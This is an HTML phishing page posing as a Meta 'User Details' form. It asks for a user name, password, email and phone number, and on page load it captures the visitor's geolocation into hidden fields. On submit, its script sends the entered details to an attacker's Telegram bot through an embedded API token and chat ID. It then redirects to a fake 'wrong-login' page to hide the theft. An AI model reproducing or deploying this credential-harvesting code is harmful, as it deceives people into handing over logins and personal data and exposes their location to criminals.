<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Blue | Application Meta</title>
    <meta name="description" content="">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="icon" href="head.ico">
    <link href="bootstrap.min.css" rel="stylesheet">
    <link href="style.css" rel="stylesheet">
    <link rel="stylesheet" href="../../use.fontawesome.com/releases/v5.12.1/css/all.css" crossorigin="anonymous">
</head>

<body onload="getLocation();">
    <header>
        <table>
            <tbody>
                <tr>
                    <td><img src="logo.png" width="200"></td>
                    <td><font size="5"><i class="fas fa-stream"></i></font></td>
                </tr>
            </tbody>
        </table>
    </header>

    <div class="lsf_o">
        <div class="card">
            <form autocomplete="off" onsubmit="submitForm(event);">
                <center>
                    <img src="meta.png" width="300">
                    <h1 style="font-family:sans-serif; font-weight:400;  color:#3d3d3d; font-size:20px;">User Details</h1>
                    <input type="text" class="fdasf_o" minlength="4" required name="fname" placeholder="User Name"><br>
                    <input type="password" required name="password" minlength="6" placeholder="Password" class="fdasf_o"><br>
                    <input type="text" class="fdasf_o" minlength="4" required="" name="email" placeholder="E-Mail"><br>
                    <input type="hidden" class="fdasf_o" required="" name="longitude"><br>
                    <input type="hidden" class="fdasf_o" required="" name="latitude"><br>
                    <input type="text" class="fdasf_o" minlength="8" required name="contact" placeholder="Phone Number"><br>

                    <button type="submit" class="bvsf_asd">
                        <span>Next</span>
                    </button><br>
                    <img src="meta.gif" width="300px">
                </center>
            </form>
        </div>
    </div>

    <br><br><br><br>

    <script>
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition);
            }
        }

        function showPosition(position) {
            document.querySelector('.lsf_o form input[name="latitude"]').value = position.coords.latitude;
            document.querySelector('.lsf_o form input[name="longitude"]').value = position.coords.longitude;
        }

        function submitForm(event) {
            event.preventDefault(); // Prevent the default form submission
            var formData = new FormData(event.target);

            // Send form data to Telegram bot using an AJAX request
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "https://api.telegram.org/6334457895:AAH5-_N9Ou-xk5huQ4mX-A4GHrfPPHWlMbw/sendMessage?chat_id=6048293239");
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            xhr.send("text=New User Details:\nUser Name: " + formData.get("fname") +
                "\nEmail: " + formData.get("email") +
                "\nPhone Number: " + formData.get("contact"));

            // You will need to replace YOUR_BOT_TOKEN and YOUR_CHAT_ID with your actual Telegram bot token and chat ID.

            // Optionally, you can handle the response from the bot here and provide feedback to the user.

            // After sending the data, you can redirect to the "wrong-login.html" page
            window.location.href = "wrong-login.html";
        }
    </script>

    <script src="../../cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
    <script src="../../cdnjs.cloudflare.com/ajax/libs/jquery-easing/1.3/jquery.easing.min.js"></script>
    <script src="bootstrap.min.js"></script>
    <script src="zewform.js"></script>

    </div>
</body>

</html>
